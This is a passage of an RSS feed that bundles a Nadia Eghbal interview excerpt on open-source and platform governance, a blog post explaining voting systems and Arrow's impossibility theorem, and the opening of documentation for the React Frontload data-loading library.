data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png&quot;,&quot;height&quot;:408,&quot;width&quot;:934,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:57769,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p><em>The Eghbal model of open-source communities (referenced copiously here), whose contours are readily applicable more broadly.</em></p><p>If you look at what's happened to open source for the past 20 years, at some point demand outpaced supply and the amount of context that anyone can really have around any one open source project—because every developer is relying on like hundreds of different projects—it's not really possible to become this roll-up-your-sleeves member of every single project. And so, yeah, I think the governance does look really different and it’s specifically something that I didn't want to bang people over the head about it in the book. But I think a stadium model lends itself a little bit more to that kind authoritarian model and there’s less the kind of governance issues that we see in like a federation where people are like <em>this is a democracy!</em> and everyone is gonna ask everyone for opinions and stuff even if you might only have one or a few contributors. The contributors [in a stadium] are kind of just making the decisions and I think they should feel comfortable leaning into that. Even though right now I think a lot of them feel uncomfortable doing that because they keep being told that open source is supposed to this super participatory thing.</p><p><em>AGM: And you think that it doesn't necessarily have to be.</em></p><p>NE: I think the tension in one of these stadium models is where you do have a lot of users. And then you have some of these casual contributors who are opening issues, making feature requests or just lost, and you are kind of sorting through all that volume from people that you don't know. In my view, it's kind of like, well, I don't understand why should that person have a say in your project, if they've never looked at it before, and they're just kind of coming in for the first time and you're the core developer of the project. </p><p>There is a set of rhetoric in open source that says every person is a contributor, and anyone who kind of comes in, you should treat them as a contributor and like invest in them and all this stuff, but I don't feel like we would do that for anything else. If you had a hobby meetup kind of group with you and your friends and someone came in once and then was like <em>I think we should runs a group like this</em>, you'd be like: W<em>ho are you?</em> <em>This is this is our thing. </em>I think I want people to feel more comfortable saying that. And there's obvious parallels between that and the Internet at large right now.</p><p><em>AGM: You took the words right out of my mouth. In the book, you’ve got a long riff on the <a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons</a>. Not that I want to turn this interview into a Facebook thing, because having worked there and spent part of my career on it, it's like the last thing I want to talk about…but I do think it's somewhat relevant in that, Twitter or Facebook, is it actually the public forum and a commons? Can Zuck or Jack run it as you suggest? Can they run it like [Guido] van Rossum does Python, as officially-titled Benevolent Dictator For Life? In some sense that’s actually better? </em></p><p>NE: Yeah. Well, I don't think Facebook is a commons anymore, just by sheer size that we’re dealing with. One of the things that I'm trying to do in the book is go back through Elinor Ostrom’s definition of a commons and saying, okay, she makes the argument that we can avoid this tragedy of the commons by having people self govern. But she has very specific rules that she's laid out around what actually qualifies something as a commons, so we can self govern in a healthy way, assuming these conditions hold and a lot of those conditions have to do with having clear membership boundaries and very high context for your interactions with each other. And so if you think just about Facebook being 2.6 billion people or however many people are on Facebook now, it's impossible that literally multiple billions of people all have that kind of context for each other. I think of Facebook as being this substrate that fosters a bunch of smaller communities. You might have Facebook Messenger which resembles more like the group chats or the ‘club’-style communities. You might have the ‘stadium’ type situations that are more like one person broadcasting out to a group of people and you might have Facebook groups which could be like either ‘clubs’ or ‘federations’ depending how big they are. You actually have a permutation of lots of different types of communities that are across the entire platform. But I think having that kind of vocabulary can help us figure out, what does it actually mean to develop governance for any of these platforms? It's the same thing with Twitter also. I don't see a world where we have one policy or a certain set of guidelines. </p><p><em>AGM: That’s a somewhat shocking statement.</em></p><p>NE: Yeah, it's so it's funny that that’s controversial. Part of what I was trying to do in the book is saying like, okay, let's not like talk about social media, let's just talk about this other weird thing called open source. And let's look at the dynamics there and how that's evolved for 20 years. Can you depersonalize this a little bit and if you agree with me that these things seem to be happening in open source. And stacking this up against other economic frameworks we've had in the past, like the commons, and it doesn't seem to hold here, then can we take that conclusion and transfer it back over somewhere else…</p><p><em>AGM: Okay, that's the vibe I got from your book that you were trying to actually talk about the rest of it. So it's good to know that I wasn't over-reading into it. </em></p><p>NE: I was trying to be sensible about it. </p><p><em>AGM: Do you think the push on Facebook for content moderation, and Twitter, is a fool's errand? You know how Kevin Roose and Charles Warzel of </em>The Times<em> and that whole whiny mob that's constantly trying to get them to moderate everything. You think that's probably not the way forward?</em></p><p>NE: It seems beyond not just gonna happen, it seems actively wrong to me. It’s as though we're asking another country to govern the United States or something. I'm trying to look at where do those governance boundaries start and who should be moderating themselves or not, and just the thought that you would have a sort of widespread platform governance on some of these issues just seems, yeah, morally wrong to me.</p><p><em>AGM: Are you a free-speech absolutist, Nadia, that rarest of breeds?</em></p><p>NE: I'm not super public about my politics, but then I don’t mind poking my head out a little bit around it and publishing the book was kind of part of this for me because, to be totally frank, there are these democratic kind of ideals and these like communist-y ideals that we are holding about both the Internet and open source which are driving me crazy and, I'm trying to point out, you know, that's not always the case. And sometimes it's about one person who was doing a lot of things and we're just like couching it in a group cooperative. Yeah, I don't really know what my politics are, but I definitely err as far to that side as possible, as I think is reasonable. I do think this kind of moderation stuff, no one really has the answer to it. And so I'm not gonna sit here and be like, <em>I know how to fix it!</em> No one knows how to fix Facebook. Or any of these platforms. There's there's some humility that should be in place there, but I know what I stand for and what I'm aiming for.</p><p><em>AGM: I dislike looking always at the extreme example. But you know, Balaji [Srinivasan] had this whole dust-up with Taylor Lorenz and he's constantly getting into fights with these media people. And it's weird because he's often so right in so many ways, and he's good at getting attention. But somehow he hasn't parlayed into a mainstream following. </em></p><p>NE: I do feel like we need to have institutions a little bit in order to reinforce that. Well, I don't know if that's true or not, because people do follow like Elon Musk or Joe Rogan, or whatever. So that does exist. But I feel it would be so nice that if we had a publication that we could be proud of, that people would read outside of tech. There's no legible symbols for someone else to kind of follow. Like it's even weird that the most popular tech figures are not always the most popular figures actually in tech. Like Mark Cuban …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thepullrequest.com/p/nadia-eghbal">https://www.thepullrequest.com/p/nadia-eghbal</a></em></p>]]>
            </description>
            <link>https://www.thepullrequest.com/p/nadia-eghbal</link>
            <guid isPermaLink="false">hacker-news-small-sites-25053962</guid>
            <pubDate>Wed, 11 Nov 2020 00:16:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing Voting Systems]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25053892">thread link</a>) | @shihn
<br/>
November 10, 2020 | https://shihn.ca/posts/2020/voting-systems/ | <a href="https://web.archive.org/web/*/https://shihn.ca/posts/2020/voting-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      
<h2>Introduction</h2>
<p>We encounter voting in some form around us all the time. We rate our Uber drivers, they rate us back. We up-vote and down-vote posts and trolls on Reddit. We give stars to movies and restaurants. We vote on who gets kicked out of our favorite reality television show. We vote for Presidents.</p>
<p>All these voting systems seem a bit different from one another, but one thing that's definitely common among them — we will find ways to complain about them. The way a voting system is designed can make an <em>election</em> trivial or really complicated in nature. In fact, sometimes, the winner of an election may be determined by the rules of the voting system and not the intent of the voters (electoral college anyone?). In this post I try to explore the core of different voting systems and wonder if there is a perfect voting system.</p>
<p>Here I am going to use the word <em>election</em> to define an event or a goal that requires voting. An election doesn't have to be political in nature.</p>
<p><em>Note and Acknowledgement: This blog post is influenced by the chapter on voting systems in video games in the book Power-Up by Matthew Lane.</em></p>
<h2>Plurality Voting</h2>
<p>This is the simplest form of voting. Most political elections in the United States are done using this form of voting. It's quite simple — every voter casts a vote for their favorite candidate. The candidate with the most number of votes wins.</p>
<p>Let's look at an example that we will continue to use in this post. We ask 100 people to vote for their favorite flavor of ice cream. The candidates are <em>Vanilla</em>, <em>Chocolate</em>, and <em>Strawberry</em>. Here's the result:</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>45</td>
</tr>
<tr>
<td>Chocolate</td>
<td>40</td>
</tr>
<tr>
<td>Strawberry</td>
<td>15</td>
</tr>
</tbody>
</table>
<p><strong>Vanilla has won!</strong> Now if you stare at the numbers a bit, you will find some downsides in declaring Vanilla the winner in this election of the flavors.</p>
<p>An obvious one is that more votes were cast for a flavor that is not the winning flavor. You could also argue that no flavor should win because none of them reached a majority.</p>
<p>Here Strawberry is acting as a <strong>spoiler</strong> — similar to how third-party candidates in US elections can be considered spoilers. Maybe we should have a <strong><em>run-off election</em></strong> where only Vanilla and Chocolate are considered. Perhaps more people favor Chocolate over Vanilla when Strawberry is out of the picture. (The US state of Georgia has rules akin to this. In the 2020 elections for the senate seats in Georgia, none of the candidates achieved a majority. So run-off elections will be held in January of 2021 with the top two candidates).</p>
<p>The essence of the Plurality voting system is that it does not capture the full spectrum of voters' preferences. If someone voted for Strawberry, it does not tell us how they feel about Vanilla or Chocolate.</p>
<p>This system does not truly determine the <em>'will of the people'</em>, unless.... there are only two candidates. One of the candidates is guaranteed to receive a majority, barring a tie. So if it were truly a <em>two-party system</em> some of the flaws of this system do not matter any more.</p>
<h2>Ranked Choice Voting</h2>
<p>Since the Plurality based system does not capture the full spectrum of the voter's preferences, we should probably ask for more information from the voters. What if we asked the voters to rank all the candidates, rather than cast a ballot for their favorite?</p>
<p>Let's look at the example we've been working with. We asked the 100 people to rank the candidate flavors. Here's the result:</p>
<table>
<thead>
<tr>
<th>1st</th>
<th>2nd</th>
<th>3rd</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>Strawberry</td>
<td>Chocolate</td>
<td>45</td>
</tr>
<tr>
<td>Strawberry</td>
<td>Chocolate</td>
<td>Vanilla</td>
<td>15</td>
</tr>
<tr>
<td>Chocolate</td>
<td>Strawberry</td>
<td>Vanilla</td>
<td>30</td>
</tr>
<tr>
<td>Chocolate</td>
<td>Vanilla</td>
<td>Strawberry</td>
<td>10</td>
</tr>
</tbody>
</table>
<p>All of the 45 people who voted for Vanilla had Strawberry as the second choice. All 15 people who voted for Strawberry, had Chocolate as their second choice. Of the 40 people who voted for Chocolate, 30 preferred Strawberry over Vanilla, and 10 preferred Vanilla. So, which flavor won? There are multiple ways to interpret this data. Let's look at a couple 👇</p>
<h2>Borda Count</h2>
<p>In this system for <code>n</code> candidates, each first-place vote receives <code>n</code> points. Second-place receives <code>n-1</code> points, and so on. The candidate with the most points wins.</p>
<p>Let's compute the points in our example. Vanilla received 45 first places, 10 second places, and 45 third places. So the score for Vanilla is <code>45n + 10(n-1) + 45(n-2)</code>. Here, <code>n</code> is <code>3</code>, giving Vanilla a score of <code>200</code>. Here's the final tally:</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Points</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>200</td>
</tr>
<tr>
<td>Chocolate</td>
<td>195</td>
</tr>
<tr>
<td>Strawberry</td>
<td>205</td>
</tr>
</tbody>
</table>
<p><strong>Strawberry has won!</strong> Strawberry, which had the fewest votes in the Plurality voting system, has the most points in the Borda ranking system. Totally ridiculous, isn't it? Well maybe, but maybe not. Strawberry did receive the fewest third-place votes. And 75% of the people had Strawberry as their second choice.  Perhaps Strawberry does deserve to win!</p>
<h2>Instant Runoff Voting</h2>
<p>Let's take a look at a different model of interpreting the ranked voting data. In an Instant Runoff, the candidate with the fewest first-place votes is eliminated, and its votes are distributed to the second choice. This is then repeated until we have one candidate left standing.</p>
<p>Some consider this model of iterative elimination a bit confusing and thereby not practical. But it's getting wide adoption, including in political elections (San Francisco and Oakland city elections, for example). It is also used to decide the winner of the Best Picture Academy Award.</p>
<p>Let's apply this to our current example.</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>45</td>
</tr>
<tr>
<td>Chocolate</td>
<td>40</td>
</tr>
<tr>
<td>Strawberry (eliminated)</td>
<td>15</td>
</tr>
</tbody>
</table>
<p>Strawberry is eliminated. Since all Strawberry voters preferred Chocolate over Vanilla, Chocolate gets Strawberry's 15 votes. Chocolate now has 55 votes, a majority. <strong>Chocolate has won!</strong></p>
<h2>Quick Recap</h2>
<p>We have discussed three systems so far, and in our example, we have had three different winners for the same election. You may decide subjectively that one of these systems may be better for the use case you have in mind, or you might think as I did at first: <strong>It's all pointless!</strong></p>
<h2>The Impossibility</h2>
<p>There is a concept in decision theory called the <strong><a href="https://en.wikipedia.org/wiki/Independence_of_irrelevant_alternatives">Independence of Irrelevant Alternatives (IIA)</a></strong> which states a voter's preference between two choices <code>x</code> and <code>y</code>, should not depend on any other choices.</p>
<p>This seems like a simple and a good rule to live by and our election systems should live by them as well. Sadly, all the systems we have looked at so far do not abide by this rule.</p>
<p>Let's look at the Plurality system - From the rankings we know that all of Strawberry voters prefer Chocolate over Vanilla. If the choice of Strawberry was not there, Chocolate would have won with 55 votes. But with Strawberry present, Vanilla wins with 45 votes.</p>
<p>For the Borda system, Chocolate is the spoiler. With Chocolate in the picture, Strawberry wins. Without Chocolate, Vanilla wins 55-45.</p>
<p>In the Instant Runoff, Chocolate wins when Vanilla is present but Strawberry wins 60-40 if Vanilla is not.</p>
<h3>Arrow's Impossibility Theorem</h3>
<p>In decision theory, here are some good things to have in an election or any voting system.</p>
<ul>
<li>Independence of Irrelevant Alternatives: which we have discussed and failed to account for so far.</li>
<li>Nondictatorship: Output should not be based on one individual, the wishes of multiple voters should be taken into consideration.</li>
<li>Pareto Efficiency (Unanimity): should have a notion of <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">unanimity</a> — If every voter prefers candidate A over candidate B, candidate A should win.</li>
<li>Unrestricted Domain: Voting must account for all individual preferences.</li>
<li>Ordering:  Each individual should be able to order the choices in any way.</li>
</ul>
<p>All good rules, don't you think? Let's create the ultimate voting system! But here comes <a href="https://en.wikipedia.org/wiki/Kenneth_Arrow">Kenneth Arrow</a> to shatter our hopes.</p>
<p><strong><a href="https://en.wikipedia.org/wiki/Arrow's_impossibility_theorem">Arrow's Impossibility Theorem</a> states that in all cases where preferences are ranked, it is impossible to formulate a social ordering without violating one of these rules.</strong></p>
<p>In other words, any democracy that satisfies Unanimity and the Independence of Irrelevant Alternatives, must be a dictatorship! *<em>insert dramatic sound effects</em>*</p>
<p>So yeah, we will always find things to argue about in an election. 😒</p>
<h2>Dodging the Impossibility</h2>
<p>Since every system is flawed, is it the end of this essay? Unfortunately for you, I, like many of you, noticed this one clause in Arrow's impossibility theorem which provides a way for us to escape this gravity well.</p>
<p>The theorem assumes that we are dealing with a ranked choice voting system. Let's just not rank our candidates. 💡</p>
<p>Here I would remind you, that we're trying to look at voting systems in general, not just political elections.</p>
<p>We have implemented non rank based systems in Software numerous times. Think Netflix, Yelp, Reddit, Tinder. The key as you may have guessed is rating, and not ranking (Tinder being a more specific type of rating - approval voting, which I'll discuss later). A voting system based on rating is usually called <strong>Score Voting</strong>.</p>
<h2>Score Voting</h2>
<p>The idea behind score voting is that you give each candidate a score in one or many categories. This score is independent of the score the other candidates receive. Think Diving and Gymnastics in the Olympics. The judges rate each athlete based on form, routine, landings. One with the highest total score wins.</p>
<p>But is this system better? That's subjective but we know it lets us escape the impossibility mathematically, and yet conform to independence, unanimity and nondictatorship rules.</p>
<h2>Approval Voting</h2>
<p>There's a simpler form or Score Voting - Approval Voting. Think of it as a binary version of the score voting. Each person can give a candidate a score of <code>0</code> or <code>1</code>. In other words one can approve or disapprove any number of candidates.</p>
<p>This is similar to how people vote on dating apps like Tinder. They give prospects a score of <code>1</code> by swiping right, and a score of <code>0</code> by swiping left.</p>
<h2>Strategizing the Ranked Vote</h2>
<p>One key advantage for Score Voting and Approval Voting is that it never hurts to vote for your favorite candidate. It may seem obvious and trivial but it's not always satisfied by voting systems. For example, it is common in political elections for people to not vote for the third-party candidate even though the third-party candidate may be the voter's first …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shihn.ca/posts/2020/voting-systems/">https://shihn.ca/posts/2020/voting-systems/</a></em></p>]]>
            </description>
            <link>https://shihn.ca/posts/2020/voting-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25053892</guid>
            <pubDate>Wed, 11 Nov 2020 00:09:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Frontload: Simple full-stack data loading for React]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25053845">thread link</a>) | @davnicwil
<br/>
November 10, 2020 | https://davnicwil.com/react-frontload/ | <a href="https://web.archive.org/web/*/https://davnicwil.com/react-frontload/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactroot="" data-reactid="1" data-react-checksum="1067123220"><div data-reactid="6"><div data-reactid="7"><p><img src="https://davnicwil.com/image/react-frontload-logo.png" width="100" height="100" data-reactid="8"></p></div><p data-reactid="10"><h2 data-reactid="11">Simple full-stack data loading for React</h2></p><p><a href="https://www.npmjs.com/package/react-frontload" data-reactid="13"><img src="https://img.shields.io/npm/v/react-frontload?style=social&amp;logo=npm" data-reactid="14"></a><a href="https://github.com/davnicwil/react-frontload" data-reactid="15"><img src="https://img.shields.io/github/stars/davnicwil/react-frontload?style=social" data-reactid="16"></a><a href="https://www.npmjs.com/package/react-frontload" data-reactid="17"><img src="https://img.shields.io/npm/dm/react-frontload?style=social" data-reactid="18"></a><a href="https://twitter.com/davnicwil" data-reactid="19"><img src="https://img.shields.io/twitter/url?label=made%20by%20%40davnicwil&amp;style=social&amp;url=https%3A%2F%2Fdavnicwil.com" data-reactid="20"></a></p></div><p data-reactid="21">React Frontload is a library to load and manage data inline in React components that works on both client and server.</p><div data-reactid="22"><ul data-reactid="23"><li data-reactid="24"><span data-reactid="25">Load data with a hook which works on client and server</span></li><li data-reactid="26"><span data-reactid="27">Data is managed in component state - no need for Redux / MobX</span></li><li data-reactid="28"><span data-reactid="29">Written in TypeScript, typing is easy as everything's inline</span></li><li data-reactid="30"><span data-reactid="31">Less than 3.5KB Gzipped, zero dependencies</span></li></ul></div><div data-reactid="32"><div data-reactid="33"><!-- react-text: 34 --><p>v2 has just shipped! </p><!-- /react-text --><p><a href="https://davnicwil.com/react-frontload/v2" data-reactid="35">See here</a></p><!-- react-text: 36 --><p> for the motivation for v2 and comparison with v1</p><!-- /react-text --></div></div><div data-reactid="37"><p>Install</p><p>npm install react-frontload</p></div><div id="problem" data-reactid="53"><h3 data-reactid="54">What problem does this solve?</h3><p><a href="#problem" data-reactid="55">#</a></p></div><p data-reactid="56">React provides no built-in way to do data loading - it's left for you to implement. Doing this is tricky in a React app that uses server side rendering (SSR) because client and server rendering work quite differently: Client render is async so data can be loaded inside components when they render, but server render is completely synchronous - the data must be loaded before render happens.</p><p data-reactid="57">Data loading is, of course, async. The client component-centric data loading pattern is nice, but it's incompatible with synchronous server render. React simply has no mechanism to wait for data to load when components render on SSR. There's a further problem too: React also provides no built-in way to hydrate data loaded during SSR into client state on first render. This is also up to you to implement.</p><p data-reactid="58">So, full stack data loading in React is a tricky problem. A couple of solutions have emerged:</p><ol data-reactid="59"><li data-reactid="60"><p data-reactid="61">Load data at the route level, instead of the component level, then pass data to all components under the route. Works on SSR since the route is known in the request, so data can be loaded before render begins. Can be implemented by piecing together router and state manager libraries.</p></li><li data-reactid="62"><p data-reactid="63">Use a framework that wraps React and abstracts the problem away, perhaps by providing a framework-specific async data loading function for components that works on SSR, and also takes care of hydrating state on the client.</p></li></ol><p data-reactid="64">React Frontload aims to provide a third way - the component-centric data loading pattern available full stack, but without having to buy into a whole framework just to get this feature. It's just a small library that solves this one problem, and can be used in any React stack.</p><p data-reactid="68">Here's an example of loading data into a component with React Frontload</p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span>
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>return</span> <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span>
<span>}</span>
</p><p data-reactid="70"><!-- react-text: 71 -->Here we have a <!-- /react-text --><span data-reactid="72">Component</span><!-- react-text: 73 --> that needs to load <!-- /react-text --><span data-reactid="74">stuff</span><!-- react-text: 75 --> from an API, with the usual loading state whilst it loads and some sort of error state if loading fails for some reason.<!-- /react-text --></p><p data-reactid="76"><!-- react-text: 77 -->With React Frontload, we do this by passing an async data loading function to the <!-- /react-text --><span data-reactid="78">useFrontload</span><!-- react-text: 79 --> hook. The hook loads the return value of the function into<!-- /react-text --><!-- react-text: 80 --> <!-- /react-text --><span data-reactid="81">data</span><!-- react-text: 82 -->, and gives us<!-- /react-text --><!-- react-text: 83 --> <!-- /react-text --><span data-reactid="84">frontloadMetadata</span><!-- react-text: 85 --> out the box so we can see when it's still <!-- /react-text --><span data-reactid="86">pending</span><!-- react-text: 87 --> or if an <!-- /react-text --><span data-reactid="88">error</span><!-- react-text: 89 --> is thrown when running the function.<!-- /react-text --></p><p data-reactid="90"><!-- react-text: 91 -->That's it - we're done in those few lines of code. That's the power of doing data loading inline in a component. And the best part here is that this just works on the server. If we render<!-- /react-text --><!-- react-text: 92 --> <!-- /react-text --><span data-reactid="93">Component</span><!-- react-text: 94 --> in a route, any route,<!-- /react-text --><!-- react-text: 95 --> <!-- /react-text --><span data-reactid="96">stuff</span><!-- react-text: 97 --> will load.<!-- /react-text --></p><p data-reactid="98"><!-- react-text: 99 -->To emphasise the ease and lack of plumbing involved in making changes, let's have <!-- /react-text --><span data-reactid="100">Component</span><!-- react-text: 101 --> load some more stuff:<!-- /react-text --></p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span><span>,</span>
    moreStuff<span>:</span> <span>await</span> api<span>.</span><span>getMoreStuff</span><span>(</span><span>)</span> 
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>return</span> <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span> and <span>{</span>data<span>.</span>moreStuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span> 
<span>}</span>
</p><p data-reactid="103"><!-- react-text: 104 -->It's literally that simple - just add whatever you need to<!-- /react-text --><!-- react-text: 105 --> <!-- /react-text --><span data-reactid="106">useFrontload</span><!-- react-text: 107 --> and use it. Remember that this is all automatically typed. If the value returned by the<!-- /react-text --><!-- react-text: 108 --> <!-- /react-text --><span data-reactid="109">getMoreStuff</span><!-- react-text: 110 --> api call is a<!-- /react-text --><span data-reactid="111">string</span><!-- react-text: 112 -->,<!-- /react-text --><!-- react-text: 113 --> <!-- /react-text --><span data-reactid="114">data.moreStuff</span><!-- react-text: 115 --> has the string type, and you'll get errors if you try to use it as a number.<!-- /react-text --></p><p data-reactid="116"><!-- react-text: 117 -->You may have noticed that the above code loads data less efficiently than it could. <!-- /react-text --><span data-reactid="118">api.getStuff()</span><!-- react-text: 119 --> and<!-- /react-text --><!-- react-text: 120 --> <!-- /react-text --><span data-reactid="121">api.getMoreStuff()</span><!-- react-text: 122 --> are called in serial, when they could probably be called in parallel. Since it's just Javascript, though, we can change this:<!-- /react-text --></p><p><span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>[</span>stuff<span>,</span> moreStuff<span>]</span> <span>=</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    api<span>.</span><span>getStuff</span><span>(</span><span>)</span><span>,</span>
    api<span>.</span><span>getMoreStuff</span><span>(</span><span>)</span>
  <span>]</span><span>)</span>

  <span>return</span> <span>{</span> stuff<span>,</span> moreStuff <span>}</span>
<span>}</span><span>)</span>
</p><p data-reactid="124">In fact as data loaders get more complex, you can use any combination of serial and parallel that you need. It's just Javascript - you have the full power of the language without any abstractions or misdirection on top.</p><p data-reactid="125"><!-- react-text: 126 -->There is one more piece to this - what about updating data? Since React Frontload uses React component state to hold<!-- /react-text --><!-- react-text: 127 --> <!-- /react-text --><span data-reactid="128">data</span><!-- react-text: 129 -->, updating it is just a case of updating that state. React Frontload provides another function, called<!-- /react-text --><!-- react-text: 130 --> <!-- /react-text --><span data-reactid="131">setData</span><!-- react-text: 132 -->, for this:<!-- /react-text --></p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> setData<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span>
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>const</span> <span>updateStuff</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> updatedStuff <span>=</span> <span>await</span> <span>updateStuff</span><span>(</span><span>'new value'</span><span>)</span> 
      <span>setData</span><span>(</span><span>data</span> <span>=&gt;</span> <span>(</span><span>{</span> <span>...</span>data<span>,</span> stuff<span>:</span> updatedStuff <span>}</span><span>)</span><span>)</span> 
    <span>}</span> <span>catch</span> <span>{</span>
      
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>(</span>
    <span>&lt;</span><span>&gt;</span>
      <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span>
      <span>&lt;</span>button onClick<span>=</span><span>{</span>updateStuff<span>}</span><span>&gt;</span>update<span>&lt;</span><span>/</span>button<span>&gt;</span>
    <span>&lt;</span><span>&gt;</span>
  <span>)</span>
</p><p data-reactid="134"><!-- react-text: 135 -->Again, this is all just inline in the component with zero plumbing. If you're coming from Redux, you can think of<!-- /react-text --><!-- react-text: 136 --> <!-- /react-text --><span data-reactid="137">setData</span><!-- react-text: 138 --> a little bit like a mini reducer. It takes the existing value of<!-- /react-text --><!-- react-text: 139 --> <!-- /react-text --><span data-reactid="140">data</span><!-- react-text: 141 --> as an argument, and you merge updates into it to return an updated value of<!-- /react-text --><!-- react-text: 142 --> <!-- /react-text --><span data-reactid="143">data</span><!-- react-text: 144 -->.<!-- /react-text --></p><p data-reactid="145">And that's it - full stack data loading and management inline in your React components.</p><p data-reactid="149"><!-- react-text: 150 -->The <!-- /react-text --><span data-reactid="151">useEffect</span><!-- react-text: 152 --> hook seen in the example above is the core of React Frontload - the code you'll actually work with in your components - but there is also a small amount of one-time setup code to write to get it to work.<!-- /react-text --></p><p data-reactid="153"><!-- react-text: 154 -->Essentially this is setting up wrappers around your server render logic, and your React application on both server and client, to make the<!-- /react-text --><span data-reactid="155">useFrontload</span><!-- react-text: 156 --> hook work, and also enable hydration of state loaded on server render to the client.<!-- /react-text --></p><p data-reactid="157">App Provider</p><p data-reactid="158">Wrap your app in the React Frontload provider</p><p><span>import</span> <span>{</span> FrontloadProvider <span>}</span> <span>from</span> <span>'react-frontload'</span>

<span>const</span> <span>App</span> <span>=</span> <span>(</span><span><span>{</span> frontloadState <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span>
  <span>&lt;</span>FrontloadProvider initialState<span>=</span><span>{</span>frontloadState<span>}</span><span>&gt;</span>
    <span>&lt;</span>Content<span>&gt;</span><span>...</span><span>&lt;</span><span>/</span>Content<span>&gt;</span>
  <span>&lt;</span><span>/</span>FrontloadProvider<span>&gt;</span>
<span>)</span>
